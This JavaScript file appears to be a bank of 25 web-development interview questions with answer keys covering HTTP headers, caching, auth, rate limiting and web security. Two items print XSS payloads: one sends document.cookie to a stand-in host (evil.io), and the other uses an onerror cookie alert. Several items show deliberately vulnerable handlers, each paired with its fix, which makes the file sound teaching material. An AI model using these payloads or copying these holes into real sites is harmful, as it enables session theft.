window.QUESTION_BANKS = window.QUESTION_BANKS || {};
window.QUESTION_BANKS["interview-web"] = [
  {
    id: "intw-001",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "Your frontend sends `fetch(\"/api/users\", { method: \"POST\", body: JSON.stringify(user) })` and the server receives the request but fails to parse the body. Which header is most likely missing?",
    code: null,
    options: {
      a: "`Accept: application/json` — it tells the server to parse the request body as JSON",
      b: "`Content-Type: application/json` — it tells the server how to interpret the request body",
      c: "`Authorization` — without it the server refuses to read the body",
      d: "`Content-Length` — fetch never sets it, so the server cannot tell where the body ends"
    },
    answer: "b",
    solution: "Correct: b. `Content-Type` describes the format of the body you are SENDING. When you pass a plain string to fetch, it defaults to `text/plain`, so JSON body parsers on the server skip or reject it. Add `headers: { \"Content-Type\": \"application/json\" }`.\n\nWhy the others are wrong:\n- a: `Accept` tells the server what format you want back in the RESPONSE; it says nothing about the request body.\n- c: `Authorization` carries credentials; missing auth gives 401, not a parse failure.\n- d: fetch computes and sets `Content-Length` automatically for string bodies."
  },
  {
    id: "intw-002",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "A user on a 1 Gbps fiber connection complains that your app still feels slow. Explain the difference between latency and bandwidth, and why a fat pipe does not guarantee a fast app.",
    code: null,
    options: null,
    answer: null,
    solution: "Bandwidth is capacity: how much data can move per second. Latency is delay: how long one round trip between client and server takes, usually measured as RTT in milliseconds. They are independent — a connection can be very wide but still far away. Loading an app involves many sequential round trips: DNS lookup, TCP handshake, TLS handshake, the HTTP request itself, then more requests for scripts, styles, and API calls that depend on each other. Each of those trips pays the full latency cost no matter how big the pipe is, and most API responses are tiny, so they are latency-bound, not bandwidth-bound. A good analogy: bandwidth is the number of lanes on a highway, latency is the length of the road — adding lanes does not shorten the drive. To fix a latency problem you move content closer (CDN, edge caching), make fewer round trips (bundling, HTTP/2 multiplexing, batching API calls), or cache so the trip never happens.\n\nInterview tip: ending with one concrete fix like \"that is why we put static assets on a CDN\" shows you have applied this, not just memorized it."
  },
  {
    id: "intw-003",
    category: "interview",
    difficulty: "basic",
    type: "code",
    question: "This raw HTTP request hits your Express server, which uses `express.json()` for body parsing, and the handler responds `400 Bad Request`. Looking only at the dump, what is wrong?",
    code: "POST /api/login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nContent-Length: 29\n\nemail=sam%40mail.com&pass=123",
    options: null,
    answer: null,
    solution: "Answer: the `Content-Type` header claims the body is JSON, but the body is actually URL-encoded form data (`key=value&key=value`). The JSON parser tries to parse `email=sam%40mail.com&pass=123` as JSON and fails, so the server returns 400.\n\nAnatomy refresher: line 1 is the request line (method, path, HTTP version), then headers as `Name: value` pairs, then one blank line, then the body. The blank line is what separates headers from body.\n\nTwo valid fixes: (1) make the client send a real JSON body like {\"email\":\"sam@mail.com\",\"pass\":\"123\"}, or (2) change the header to `application/x-www-form-urlencoded` and add `express.urlencoded()` on the server. The header and the body format must agree — the server trusts the header to pick a parser."
  },
  {
    id: "intw-004",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "Your company rebrands and moves permanently from `old-site.com` to `new-site.com`. Which redirect should the old domain return, and why does the choice matter?",
    code: null,
    options: {
      a: "301 — browsers cache it and search engines treat it as permanent, transferring ranking signals to the new URL",
      b: "302 — it is the safer default because browsers never cache redirects",
      c: "301 — it forces every client to clear its cached pages for the old domain",
      d: "302 — it tells search engines to index the new URL in place of the old one"
    },
    answer: "a",
    solution: "Correct: a. 301 Moved Permanently is the signal for \"this resource lives at the new URL forever\": browsers cache the redirect and skip the old URL next time, and search engines move indexing and most ranking value to the new address.\n\nWhy the others are wrong:\n- b: 302 means temporary; browsers may cache 302s less aggressively but the real issue is semantics — search engines keep the OLD URL indexed.\n- c: 301 does not clear anything; in fact it gets cached hard, which is why a mistaken 301 is painful to undo. Use 302 first if you are unsure.\n- d: that describes 301 behavior, not 302 — with a 302 search engines assume the move is temporary and keep the old URL."
  },
  {
    id: "intw-005",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "In plain terms, what is the difference between authentication and authorization? And when a site offers \"Log in with Google\", what problem is OAuth actually solving?",
    code: null,
    options: null,
    answer: null,
    solution: "Authentication answers \"who are you?\" — verifying identity with a password, passkey, or a trusted third party. Authorization answers \"what are you allowed to do?\" — checking permissions after identity is known. They always happen in that order: you cannot decide what someone may do before you know who they are. OAuth is, strictly speaking, an authorization and delegation protocol: it lets an app act on your behalf at another service — for example, read your Google profile — without ever seeing your Google password. The app redirects you to Google, you consent to specific scopes, and the app receives a limited access token instead of your credentials. \"Log in with Google\" works because OpenID Connect, a thin identity layer on top of OAuth, adds an ID token that proves who you are. The big wins are that the third-party app never handles your password, the token has limited scope, and Google can revoke it independently.\n\nInterview tip: saying \"OAuth is delegated authorization, and OpenID Connect adds the login part\" is a one-liner that separates you from candidates who call OAuth an authentication protocol."
  },
  {
    id: "intw-006",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "The product list has NOT changed on the server since the first request. What status code and body does the second request receive, and why is this flow faster than a normal fetch?",
    code: "GET /api/products HTTP/1.1\nHost: shop.example.com\n\nHTTP/1.1 200 OK\nETag: \"v42\"\nCache-Control: max-age=0, must-revalidate\n\n[ ...2 KB JSON body... ]\n\nGET /api/products HTTP/1.1\nHost: shop.example.com\nIf-None-Match: \"v42\"",
    options: null,
    answer: null,
    solution: "Answer: `304 Not Modified` with an EMPTY body — and the browser then serves the 2 KB JSON from its own cache.\n\nHow it works: the `ETag` is a fingerprint of the response version (here \"v42\"). Because `Cache-Control: max-age=0, must-revalidate` marks the cached copy as immediately stale, the browser must check back before reusing it — but it checks cheaply by sending `If-None-Match: \"v42\"`. The server compares fingerprints: they match, so instead of re-sending the payload it answers 304 with no body. You pay one small round trip but skip the transfer entirely, which matters a lot for large responses or slow links. If the data HAD changed, the server would reply `200 OK` with the fresh body and a new ETag, and the cycle repeats. This conditional-request flow is the backbone of HTTP revalidation."
  },
  {
    id: "intw-007",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "What is the main way a CDN like Cloudflare or CloudFront speeds up your site?",
    code: null,
    options: {
      a: "It compiles your JavaScript ahead of time so browsers parse it faster",
      b: "It increases your origin server's bandwidth by load-balancing requests across regions",
      c: "It caches copies of your assets on edge servers geographically close to users, cutting round-trip latency",
      d: "It upgrades all traffic to HTTPS, which is inherently faster than HTTP"
    },
    answer: "c",
    solution: "Correct: c. A CDN is a network of edge servers around the world. Static assets (images, CSS, JS, fonts — and increasingly cached API responses) are stored at the edge, so a user in Tokyo gets the file from a Tokyo edge node instead of your origin in Virginia. Shorter distance means lower latency per round trip, and the origin is shielded from most traffic.\n\nWhy the others are wrong:\n- a: CDNs deliver bytes; they do not compile or transform your JavaScript.\n- b: spreading load is a side benefit (origin shielding), but the headline win is proximity, not raw bandwidth.\n- d: HTTPS adds a handshake; it is not faster by itself (HTTP/2 and HTTP/3, which require or pair with TLS, are a different story)."
  },
  {
    id: "intw-008",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "Compare cookie-based server sessions with token-based auth. What are the tradeoffs, and when would you pick each?",
    code: null,
    options: null,
    answer: null,
    solution: "With server sessions, login creates a record on the server (memory, Redis, or a DB) and the browser gets a cookie holding only an opaque session ID; every request looks that ID up. With token-based auth like JWTs, the server signs a self-contained token holding the user's claims, and the client sends it on each request; the server just verifies the signature — no lookup. Sessions give you instant revocation (delete the server record and the user is logged out) and tiny cookies, but they are stateful: to scale horizontally you need a shared session store or sticky sessions. Tokens are stateless and travel well across multiple APIs, microservices, and mobile clients, but revocation is hard — a stolen token is valid until it expires — so you keep them short-lived and pair them with refresh tokens, which quietly reintroduces some state. Also remember a JWT payload is only base64-encoded, not encrypted, so never put secrets in it. A sensible default: cookie sessions for a classic server-rendered web app with one backend; tokens for SPAs or mobile apps talking to multiple distributed services.\n\nInterview tip: mentioning the revocation tradeoff is usually the thing the interviewer is fishing for."
  },
  {
    id: "intw-009",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "You deploy a new version behind nginx. During the deploy users briefly see `502 Bad Gateway`, then a minute later some see `503 Service Unavailable`. What is the actual difference between these codes?",
    code: null,
    options: {
      a: "Both mean nginx itself crashed; which number you get depends on the nginx version",
      b: "502 means the client sent a malformed request through the proxy; 503 means the server is at fault",
      c: "502 means nginx ran out of worker connections; 503 means the app threw an unhandled exception",
      d: "502 means the gateway got no valid response from the app behind it; 503 means the service is temporarily unable to serve, often deliberately"
    },
    answer: "d",
    solution: "Correct: d. 502 Bad Gateway is the proxy saying \"I tried to talk to the app behind me and got nothing usable\" — classic during a deploy when the old process is killed before the new one listens. 503 Service Unavailable means \"the service exists but cannot serve right now\" — maintenance mode, an overloaded server shedding load, or a health check intentionally failing; well-behaved servers add `Retry-After`. For contrast, 500 is the app itself crashing while handling your request.\n\nWhy the others are wrong:\n- a: if nginx itself were dead you would get a connection error, not a status code; the number is semantic, not version-dependent.\n- b: malformed client requests are 4xx territory (400); both 502 and 503 are server-side.\n- c: those specific causes are not what distinguishes the codes — 502 is about a bad upstream response, 503 about temporary unavailability."
  },
  {
    id: "intw-010",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "A pentester emails your users a link to `/search?q=<script>fetch('//evil.io?c='+document.cookie)</script>`. What attack is this, which sub-type is it, and how do you fix the handler?",
    code: "// Express search endpoint\napp.get(\"/search\", (req, res) => {\n  const q = req.query.q;\n  res.send(\"<h1>Results for \" + q + \"</h1>\" +\n           \"<div id=\\\"results\\\"></div>\");\n});",
    options: null,
    answer: null,
    solution: "Answer: reflected cross-site scripting (XSS). The handler takes attacker-controlled input (`req.query.q`) and writes it into the HTML response without escaping, so the `<script>` in the URL executes in the victim's browser under YOUR origin and can steal cookies or act as the user.\n\nSub-types: REFLECTED XSS bounces the payload straight off a request like this one — the victim must click a crafted link. STORED XSS is worse: the payload is saved (e.g., in a comment) and runs for every visitor. DOM-based XSS never touches the server — client-side JS writes a tainted value into a dangerous sink like `innerHTML`.\n\nFixes, in order of importance: (1) escape output — HTML-encode `q` so `<` becomes `&lt;` (template engines like EJS with `<%= %>` or React JSX do this by default; never concatenate raw input into HTML); (2) add a Content-Security-Policy that disallows inline scripts, as a second layer; (3) mark session cookies `HttpOnly` so even a successful XSS cannot read them. Interviewers grade XSS answers on naming the defenses, not describing the attack."
  },
  {
    id: "intw-011",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "Your team is starting a new mobile app backend and a teammate proposes GraphQL instead of REST. How would you compare the two, and what would make you pick one over the other?",
    code: null,
    options: null,
    answer: null,
    solution: "REST models the API as resources at multiple URLs using HTTP verbs, and each endpoint returns a fixed shape. That fixed shape causes over-fetching (you get fields you do not need) and under-fetching (one screen needs three sequential calls). GraphQL exposes a single endpoint where the client sends a query naming exactly the fields it wants, so one round trip can assemble a whole screen — a real win on mobile where latency and payload size hurt. The tradeoffs: REST gets HTTP caching almost for free (GETs, ETags, CDNs cache by URL), is simpler to build and debug, and status codes map cleanly; GraphQL responses are POSTs to one URL, so HTTP-level caching mostly stops working, every query returns 200 even on errors, and the server needs protection against expensive queries (depth limits, cost analysis, N+1 dataloaders). My rule of thumb: REST for public APIs, simple CRUD services, or anything cache-heavy; GraphQL when many different clients need different slices of a rich data graph and you can afford the server-side complexity.\n\nInterview tip: name over-fetching AND the caching tradeoff — most candidates only mention the first."
  },
  {
    id: "intw-012",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "A user clicks \"Pay\", the request times out, and the client never learns whether the charge succeeded. What API design lets the client retry safely without risking a double charge?",
    code: null,
    options: {
      a: "Switch the endpoint from POST to PUT, since PUT is idempotent by definition",
      b: "Have the client send a unique idempotency key with the request; the server remembers it and returns the original result on any retry",
      c: "Return `409 Conflict` on every retry so the client knows to stop retrying",
      d: "Use GET for the payment so the browser can re-issue the request automatically"
    },
    answer: "b",
    solution: "Correct: b. This is the Stripe-style `Idempotency-Key` pattern: the client generates a unique key (e.g., a UUID) per logical payment attempt. The server stores the key with the outcome of the first execution; if the same key arrives again, it does NOT re-run the charge — it replays the stored response. Retries become completely safe even when the client never saw the first answer.\n\nWhy the others are wrong:\n- a: relabeling the method does not deduplicate anything — PUT is only naturally idempotent when the client controls the resource ID and the operation is a full replace, which a \"create a charge\" call is not.\n- c: a blanket 409 does not tell the client whether the money moved — the original uncertainty remains.\n- d: GET must be safe (no side effects); a GET that charges money breaks caches, prefetching, and every HTTP assumption."
  },
  {
    id: "intw-013",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "Users scrolling an active feed report seeing the same posts twice and missing others entirely. The SQL itself is correct. What is the design flaw in this pagination, and what would you use instead?",
    code: "// GET /api/feed?page=3&size=20\napp.get(\"/api/feed\", async (req, res) => {\n  const page = Number(req.query.page);\n  const size = Number(req.query.size);\n  const rows = await db.query(\n    \"SELECT * FROM posts ORDER BY created_at DESC\" +\n    \" LIMIT $1 OFFSET $2\",\n    [size, (page - 1) * size]\n  );\n  res.json(rows);\n});",
    options: null,
    answer: null,
    solution: "Answer: offset/limit pagination over a dataset that changes between requests. New posts are inserted at the top of the feed, which shifts every existing row down — so by the time the client asks for page 3, rows that were on page 2 have slid into page 3 (duplicates) and others have slid past it (gaps). A second problem: `OFFSET 4000` makes the database walk and discard 4000 rows, so deep pages get progressively slower.\n\nFix: cursor-based (keyset) pagination. Instead of a page number, the client sends an opaque cursor identifying the last item it saw, and the query becomes `WHERE (created_at, id) < ($cursor_ts, $cursor_id) ORDER BY created_at DESC, id DESC LIMIT $size`, with the server returning the next cursor alongside the results. Results stay stable while rows are inserted, and the query uses an index seek instead of scanning past skipped rows. Include `id` as a tiebreaker so identical timestamps cannot cause skips. Offset pagination is still fine for small, mostly-static, jump-to-page-N admin tables — that nuance is worth saying out loud.\n\nAlso worth flagging: `size` is unvalidated, so a client can request `size=100000` — always cap page size."
  },
  {
    id: "intw-014",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "You update your domain's `A` record to point at a new server's IP address, but hours later some users are still hitting the old server. Why?",
    code: null,
    options: {
      a: "DNS answers are cached at many layers — browser, OS, router, recursive resolver — each for the record's TTL, so stale answers survive until they expire",
      b: "Browsers keep a TCP connection open to the old IP until the user clears their cookies",
      c: "`A` records only propagate once per day, at midnight UTC",
      d: "You also needed to delete the CNAME record, which always overrides the A record"
    },
    answer: "a",
    solution: "Correct: a. An `A` record maps a hostname to an IPv4 address, and every answer carries a TTL (time to live) in seconds. Each cache along the chain — the browser's DNS cache, the OS, the home router, the ISP's recursive resolver — keeps the old answer until its TTL runs out, and they emptied their caches at different times. The standard migration trick: lower the TTL to something like 60 seconds a day or two BEFORE the switch, flip the record, then raise the TTL again.\n\nWhy the others are wrong:\n- b: cookies have nothing to do with connection reuse or DNS; persistent connections also do not last hours.\n- c: there is no global propagation schedule — \"propagation\" is just caches expiring on their own TTLs.\n- d: a name has either a CNAME or an A record, not a hidden CNAME overriding things; that configuration is invalid at the same name."
  },
  {
    id: "intw-015",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "You are adding live notifications to a web dashboard. Compare short polling, long polling, Server-Sent Events, and WebSockets — which would you choose here and why?",
    code: null,
    options: null,
    answer: null,
    solution: "Short polling: the client asks \"anything new?\" on a fixed interval. Dead simple and works everywhere, but it wastes requests when nothing changed and the average notification delay is half the interval. Long polling: the client sends a request and the server HOLDS it open until there is data or a timeout, then the client immediately re-asks. Much better latency, still one full HTTP request per message plus reconnect overhead. Server-Sent Events: the client opens one long-lived HTTP connection and the server streams text events down it whenever it likes — one direction only, server to client — with automatic reconnection and last-event-id resume built into the browser's EventSource API. WebSockets: a persistent, full-duplex socket upgraded from HTTP; either side can send at any time, which is ideal for chat, games, and collaborative editing, but it is more infrastructure to operate (connection state, scaling, proxies, heartbeats). For one-way notifications, SSE is the sweet spot: real-time delivery, plain HTTP, free reconnection, no protocol upgrade. I would reach for WebSockets only when the client also needs to push messages back over the same channel.\n\nInterview tip: stating the direction of data flow for each option is the fastest way to show you actually understand the differences."
  },
  {
    id: "intw-016",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Two admins open the same product record. Both edit it; the second save would silently overwrite the first admin's changes. Which response and mechanism handles this best?",
    code: null,
    options: {
      a: "`200 OK` — last write wins is the standard REST behavior and admins can coordinate manually",
      b: "`429 Too Many Requests` — the second admin is updating the resource too frequently",
      c: "`409 Conflict` — the server detects the update is based on a stale version (via a version number or `If-Match`/ETag) and rejects it so the client can re-fetch and merge",
      d: "`423 Locked` — HTTP requires locking the row while the first admin has the edit form open"
    },
    answer: "c",
    solution: "Correct: c. This is optimistic concurrency control: each record carries a version (a number or an ETag). The client sends back the version it edited — for example in an `If-Match` header — and the server compares it to the current one. Mismatch means someone saved in between, so the server rejects the write and the client re-fetches, shows a diff, or merges. `409 Conflict` is precisely \"your request conflicts with the current state of the resource\"; it is also the right code for things like duplicate-username registration. Precision point worth mentioning: when the check is done via the HTTP-native `If-Match` precondition, the spec-defined status is `412 Precondition Failed` — `409` is the conventional choice when the version travels in the request body or an application field. Knowing both codes exist is a senior-level detail.\n\nWhy the others are wrong:\n- a: last-write-wins silently destroys data — the exact bug described.\n- b: 429 is rate limiting (too many requests over time), unrelated to data conflicts.\n- d: 423 comes from WebDAV, and pessimistic locks held while a human stares at a form lead to abandoned-lock misery; HTTP requires no such thing."
  },
  {
    id: "intw-017",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "This endpoint must be publicly reachable so the payment provider can call it. What is the security hole, how do providers like Stripe close it, and what is one more reliability concern every webhook consumer has to handle?",
    code: "// Payment provider calls this when a charge completes\napp.post(\"/webhooks/payment\", express.json(),\n  async (req, res) => {\n    const event = req.body;\n    if (event.type === \"charge.succeeded\") {\n      await markOrderPaid(event.orderId);\n    }\n    res.sendStatus(200);\n  });",
    options: null,
    answer: null,
    solution: "Answer: the handler trusts ANY request that reaches the URL. An attacker who discovers or guesses `/webhooks/payment` can POST a fake `{\"type\":\"charge.succeeded\",\"orderId\":...}` and get orders marked paid for free.\n\nFix: verify the webhook signature. Providers sign each delivery — typically an HMAC-SHA256 of the RAW request body using a shared secret, sent in a header like `Stripe-Signature` — and your handler must recompute the HMAC and reject mismatches. Two implementation gotchas: you need the raw body bytes (use `express.raw()` for this route, because `express.json()` re-serialization can change bytes and break the HMAC), and you should check the signed timestamp to block replay attacks of captured deliveries.\n\nReliability concern: providers retry on timeouts and non-2xx responses, so the same event WILL arrive more than once. The handler must be idempotent — store processed event IDs and skip duplicates — and it should respond 2xx quickly, pushing slow work onto a queue, or the retries themselves will pile up. Bonus point: a webhook can arrive out of order, so reconcile against the provider's API for anything money-critical."
  },
  {
    id: "intw-018",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "A non-technical friend says a website must be safe because it shows the padlock. What does HTTPS actually protect, and what does it NOT protect against?",
    code: null,
    options: null,
    answer: null,
    solution: "HTTPS is HTTP run over TLS, and it gives you three things for data in transit. Confidentiality: traffic is encrypted, so someone on the same coffee-shop wifi cannot read your passwords or card numbers. Integrity: the data cannot be silently modified on the way — no ISP injecting ads or attacker swapping a download. Authentication of the SERVER: the certificate, vouched for by a certificate authority, proves you are really talking to the domain in the address bar and not an impostor in the middle. Under the hood the handshake uses asymmetric crypto to verify the certificate and agree on keys, then switches to fast symmetric encryption for the actual data. What the padlock does NOT mean: that the site is honest or safe. Phishing sites get free certificates in minutes, so `secure-paypa1.com` can show a padlock while stealing credentials. HTTPS also does nothing about what happens AFTER transit — the server can store your data badly, the app can have XSS or SQL injection, and an observer can still see WHICH domain you visited even if not the pages. Short version: the padlock means the conversation is private — possibly a private conversation with a criminal.\n\nInterview tip: \"encryption in transit, not a trust badge\" is a tidy closing line."
  },
  {
    id: "intw-019",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Your app uses cookie-based sessions. Which cookie attribute most directly blunts CSRF, and how?",
    code: null,
    options: {
      a: "`HttpOnly` — JavaScript cannot read the cookie, so an attacker cannot forge requests with it",
      b: "`Secure` — the cookie only travels over HTTPS, which a CSRF attack cannot use",
      c: "`Domain` — restricting the domain controls which sites are allowed to send the cookie",
      d: "`SameSite=Lax` (or `Strict`) — the browser stops attaching the cookie to cross-site subrequests and cross-site POSTs, so a forged request from evil.com arrives without a session"
    },
    answer: "d",
    solution: "Correct: d. CSRF works because browsers historically attached cookies to ANY request aimed at your domain, even one triggered from a hostile page — so a hidden form on evil.com could POST `/transfer` and ride the victim's session. `SameSite=Lax` tells the browser not to send the cookie on cross-site subrequests and cross-site POSTs (it still allows top-level GET navigation, which is why state-changing actions must never be GETs); `Strict` withholds it on all cross-site requests. The forged request arrives unauthenticated and fails.\n\nWhy the others are wrong:\n- a: `HttpOnly` defends against XSS cookie THEFT — CSRF never needs to read the cookie, only to make the browser send it.\n- b: CSRF attacks happily target HTTPS sites; `Secure` only blocks plain-HTTP transmission.\n- c: `Domain` controls which HOSTS receive the cookie, not which site initiated the request.\n\nDefense in depth: pair SameSite with anti-CSRF tokens for anything high-value, since older browsers and edge cases exist."
  },
  {
    id: "intw-020",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "No server code ever touches `location.hash`, and your server-side templating escapes everything — yet this page is still exploitable. Name the vulnerability class, sketch a payload, and give two fixes.",
    code: "<!-- profile.html -->\n<div id=\"banner\"></div>\n<script>\n  // Show a welcome message from the URL, e.g. /profile#Sam\n  const name = decodeURIComponent(location.hash.slice(1));\n  document.getElementById(\"banner\").innerHTML =\n    \"Welcome back, \" + name + \"!\";\n</script>",
    options: null,
    answer: null,
    solution: "Answer: DOM-based XSS. The taint flows entirely in the browser — from an attacker-controlled SOURCE (`location.hash`) into a dangerous SINK (`innerHTML`) — so server-side escaping and even a WAF never see it; the fragment after `#` is not even sent to the server.\n\nPayload idea: send the victim `/profile#<img src=x onerror=alert(document.cookie)>`. Note the detail: `<script>` tags inserted via `innerHTML` do NOT execute, but event handlers on injected elements (like `onerror`) DO — that nuance impresses interviewers.\n\nFixes: (1) Use a safe sink — `element.textContent = \"Welcome back, \" + name` renders the input as inert text, which is the right tool since no HTML is needed here. (2) Add a Content-Security-Policy such as `script-src 'self'` with no `unsafe-inline`, which blocks injected inline handlers as a second layer. If you genuinely must render user-supplied HTML, sanitize it with a vetted library like DOMPurify — never with a homemade regex."
  },
  {
    id: "intw-021",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "Your public API needs a breaking change to a response shape that thousands of third-party clients depend on. How do you roll it out without breaking them — and how would you have set up versioning from day one?",
    code: null,
    options: null,
    answer: null,
    solution: "First, decide whether the change is truly breaking. Adding new fields is non-breaking for well-built clients; renaming, removing, or changing the type or meaning of a field is breaking and needs a version boundary. The common versioning schemes: URL path versioning (`/v1/orders`) — explicit, cacheable, trivial to route and test in a browser, which is why it is the most common choice; header versioning (`Accept: application/vnd.myapi.v2+json`) — keeps URLs clean and is arguably more RESTful, but harder to explore and easy for clients to forget; query-param versioning sits in between. Whichever you pick, the rollout pattern is the same: ship v2 alongside v1, never in place of it; announce the deprecation with a clear timeline; advertise it in-band with `Deprecation` and `Sunset` headers so client developers see it in their tooling; monitor per-version, per-consumer usage so you know exactly who is still on v1; reach out to the holdouts; and only shut v1 down after the published date with a long overlap window. From day one, the cheapest insurance is putting `/v1/` in the path even if you never expect a v2, plus designing for additive evolution — tolerant readers, no reuse of field names with new meanings — so most changes never need a new version at all.\n\nInterview tip: the phrase \"versions are a contract, deprecation is a process\" frames the answer well."
  },
  {
    id: "intw-022",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Your API uses a token bucket rate limiter: bucket capacity 10, refill rate 1 token per second. A client that has been idle for a full minute suddenly fires 15 requests at virtually the same instant. What happens?",
    code: null,
    options: {
      a: "The first 10 succeed — the full bucket allows a burst — and the remaining 5 get `429 Too Many Requests`, ideally with a `Retry-After` header",
      b: "All 15 succeed, because a minute of idling banked 60 tokens",
      c: "Only 1 succeeds, because the refill rate is 1 request per second",
      d: "All 15 are rejected — bursts are exactly what rate limiting is designed to prevent"
    },
    answer: "a",
    solution: "Correct: a. In a token bucket, each request spends one token and tokens refill at a steady rate, but the bucket never holds more than its CAPACITY — idle time cannot bank tokens beyond 10. So the burst spends the 10 available tokens, and requests 11 through 15 are rejected with `429 Too Many Requests`. A polite server includes `Retry-After` (or `X-RateLimit-Remaining`/reset headers), and a well-behaved client backs off — ideally exponentially with jitter — instead of hammering.\n\nWhy the others are wrong:\n- b: that would be an unbounded accumulator, not a token bucket; capacity caps the burst.\n- c: refill rate limits the sustained AVERAGE, not the instantaneous burst — confusing the two is the classic token-bucket misunderstanding.\n- d: allowing short bursts while capping the long-run rate is precisely WHY token bucket is chosen over a rigid fixed-rate limiter.\n\nWhy APIs do this at all: protecting shared capacity from runaway clients, containing abuse and scraping, and keeping one noisy tenant from degrading everyone else."
  },
  {
    id: "intw-023",
    category: "interview",
    difficulty: "advanced",
    type: "code",
    question: "A security review flags the `res.cookie(\"sid\", sid)` line. Which three cookie attributes are missing, and which specific attack does each one mitigate?",
    code: "// Login succeeds — set the session cookie\napp.post(\"/login\", async (req, res) => {\n  const user = await verifyLogin(\n    req.body.email, req.body.password);\n  const sid = await createSession(user.id);\n  res.cookie(\"sid\", sid);\n  res.json({ ok: true });\n});",
    options: null,
    answer: null,
    solution: "Answer: the cookie should be set as `res.cookie(\"sid\", sid, { httpOnly: true, secure: true, sameSite: \"lax\", maxAge: ... })`. The three missing protections:\n\n1. `httpOnly: true` — the cookie becomes invisible to JavaScript (`document.cookie` cannot read it). Mitigates session THEFT via XSS: even if an attacker gets a script running on your page, they cannot exfiltrate the session ID.\n\n2. `secure: true` — the browser will only send the cookie over HTTPS. Mitigates network sniffing and downgrade tricks where an attacker lures the browser into making a plain-HTTP request and captures the session in cleartext.\n\n3. `sameSite: \"lax\"` (or `\"strict\"`) — the browser withholds the cookie on cross-site requests. Mitigates CSRF: a forged POST from a hostile site arrives without the session attached.\n\nEach flag maps to a different attack, which is exactly how interviewers want it answered: HttpOnly vs XSS theft, Secure vs eavesdropping, SameSite vs CSRF. Also worth adding an explicit `maxAge` so sessions expire, and note that none of these flags excuses skipping output escaping or CSRF tokens — they are layers, not replacements."
  },
  {
    id: "intw-024",
    category: "interview",
    difficulty: "advanced",
    type: "mcq",
    question: "A teammate sets `Cache-Control: no-cache` on API responses containing private account data, believing this prevents them from being cached anywhere. What is wrong with that belief?",
    code: null,
    options: {
      a: "Nothing — `no-cache` forbids any cache, shared or private, from storing the response",
      b: "`no-cache` only applies to CDNs and proxies; browsers are free to ignore it",
      c: "`no-cache` allows the response to be STORED but requires revalidation with the origin before each reuse; to forbid storage you need `no-store` (and `private` to keep shared caches out)",
      d: "The correct directive is `max-age=0`, which actively deletes the response from every cache along the path"
    },
    answer: "c",
    solution: "Correct: c. Despite the name, `no-cache` means \"you may keep a copy, but you must check with the server (revalidate, e.g., via `If-None-Match`/ETag) before using it again.\" The bytes can still land in browser and proxy cache storage. For sensitive data the right directive is `no-store` — never write this response to any cache — commonly sent as `Cache-Control: no-store` or combined with `private` so shared caches are explicitly excluded. (`private` alone still lets the user's own browser cache it.)\n\nWhy the others are wrong:\n- a: that describes `no-store`, not `no-cache` — the misnaming is the whole trap.\n- b: Cache-Control directives bind all caches, browsers included.\n- d: `max-age=0` just marks the copy stale immediately — it is still stored, and nothing in HTTP \"deletes\" entries from caches along the path.\n\nThis pairing — `no-cache` = store-but-revalidate, `no-store` = never store — is one of the most reliable senior-sounding distinctions a junior can drop in an interview."
  },
  {
    id: "intw-025",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "You integrate a payment provider, and a payment can take several minutes to complete. Would you poll their API for the result or use a webhook? Explain the difference between the two approaches.",
    code: null,
    options: null,
    answer: null,
    solution: "Polling is pull: my server repeatedly calls their API — \"is payment 123 done yet?\" — on some interval. It is simple and keeps all the initiative on my side, but it wastes requests when nothing has changed, it can run into their rate limits, and my average notification delay is half the polling interval, so I am choosing between being slow and being noisy. A webhook is push: I register a URL with the provider, and when the payment completes THEY send an HTTP POST to my endpoint with the event. I learn about it within seconds, with zero wasted calls. The costs of webhooks are operational: I must expose a public endpoint, verify each delivery is genuinely from the provider (signature verification), respond quickly with a 2xx, and handle their retries — which means deduplicating events, since the same one can arrive twice. For a payment flow the standard answer is webhooks for real-time updates, often backed by a periodic reconciliation poll as a safety net in case a webhook delivery is missed.\n\nInterview tip: \"webhooks are push, polling is pull\" plus one security point (verify the signature) is exactly the level of answer expected here."
  }
];
